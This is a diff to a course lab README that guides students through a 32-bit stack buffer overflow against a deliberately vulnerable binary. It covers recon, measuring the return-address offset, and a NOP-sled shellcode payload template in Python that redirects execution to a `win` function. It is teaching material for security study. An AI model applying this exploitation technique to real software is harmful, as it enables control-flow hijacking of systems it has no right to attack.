@@ -36,11 +36,17 @@ buffer (low address) ------> higher addresses ------> saved return addr
 
 ```bash
 make
-file vulnerable
+file vulnerable      # ELF 32-bit ... Intel 80386
 ```
 
 This level links with `-z execstack` so the stack is executable (otherwise
-injected shellcode cannot run).
+injected shellcode cannot run). **Read the compiler warnings.**
+
+Confirm ASLR is off:
+
+```bash
+cat /proc/sys/kernel/randomize_va_space   # expect 0
+```
 
 ## Step 2 — Recon
 
@@ -49,42 +55,45 @@ injected shellcode cannot run).
 ```
 
 Note the printed `[leak] buffer @ 0x........` address. That is where your
-NOP sled + shellcode will live.
+NOP sled + shellcode will live. Re-read it each run if addresses move.
 
-Find `win` with static GDB:
+Find `win`:
 
 ```bash
+nm vulnerable | grep ' win$'
+# or
 gdb -q -batch -ex "info address win" ./vulnerable
 ```
 
 ## Step 3 — Find the offset to the return address
 
-You must write enough bytes to fill `buffer[128]`, then whatever the compiler
-placed between the buffer and the saved return address (saved frame pointer
-and possible alignment padding), and then overwrite the return address.
+You must fill past `buffer[128]` and any saved frame pointer / alignment
+padding until you reach the return address.
 
-On the course Docker image (Debian bookworm i386, this Makefile), the measured
-offset is:
+**Measure on your VM** (do not copy a number from another machine blindly):
 
-```text
-offset to return address = 140
+```bash
+gdb ./vulnerable
+(gdb) disassemble vulnerable
+(gdb) break vulnerable
+(gdb) run
+# after the buffer exists:
+(gdb) print &buffer
+(gdb) info frame
 ```
 
-(Not always `128 + 4` — modern gcc may insert alignment padding. Always
-verify if you change compilers or flags.)
-
-Verify on a real x86 GDB session if you can (`cyclic` pattern / `info frame`).
-Under Docker emulation, start with **140** and adjust if needed.
+A common starting guess on `-O0` i386 builds is a bit above `128 + 4`, but
+**verify**. If your payload fails, adjust the offset.
 
 ## Step 4 — Build the payload
 
 Structure:
 
 1. Many `\x90` NOPs (the sled)
-2. Short shellcode that calls `win` (provided below — fill in `win`'s address)
-3. Padding until you reach the return-address slot
-4. A 4-byte little-endian address pointing **into the middle of your NOP sled**
-   (use the leaked buffer address + some offset into the sled)
+2. Short shellcode that calls `win`
+3. Padding until the return-address slot
+4. A 4-byte little-endian address pointing into the middle of your NOP sled
+   (use the leaked buffer address + a small offset into the sled)
 
 Example shellcode (32-bit): `mov eax, win_addr` ; `call eax`
 
@@ -92,15 +101,15 @@ Example shellcode (32-bit): `mov eax, win_addr` ; `call eax`
 \xb8 <win_addr as 4 little-endian bytes> \xff\xd0
 ```
 
-Template (adjust addresses/offsets from recon):
+Template (`solve.py`):
 
 ```python
 import sys
 import struct
 
-buf_addr = 0xFFFFDxxx   # from the [leak] line (re-read each run)
-win_addr = 0x08049xxx   # from: info address win
-offset   = 140          # measured on course Docker i386 image
+buf_addr = 0xREPLACE_ME   # from the [leak] line
+win_addr = 0xREPLACE_ME   # from nm / gdb
+offset   = REPLACE_ME     # measured on YOUR vm
 
 nops = b"\x90" * 64
 shellcode = b"\xb8" + struct.pack("<I", win_addr) + b"\xff\xd0"
@@ -110,14 +119,9 @@ ret = struct.pack("<I", buf_addr + 16)  # land mid-sled
 sys.stdout.buffer.write(nops + shellcode + padding + ret)
 ```
 
-Run:
-
 ```bash
 python3 solve.py | ./vulnerable
 ```
-
-Prefer `setarch "$(uname -m)" -R ./vulnerable` on a real Linux box so ASLR
-does not move the stack between runs.
 
 ## Step 5 — Submit
 
@@ -133,6 +137,6 @@ does not move the stack between runs.
 - The saved return address controls where the function returns.
 - Overwriting it redirects the CPU (control-flow hijack).
 - NOPs (`\x90`) buy you tolerance on the landing address.
-- Shellcode is just bytes the CPU executes if you point EIP/RIP at them.
-- NX / non-executable stacks exist specifically to stop this class of attack
-  (`-z execstack` turns that protection off for the lab).
+- Shellcode is just bytes the CPU executes if you point EIP at them.
+- NX / non-executable stacks exist to stop this class of attack
+  (`-z execstack` turns that protection off for this level only).
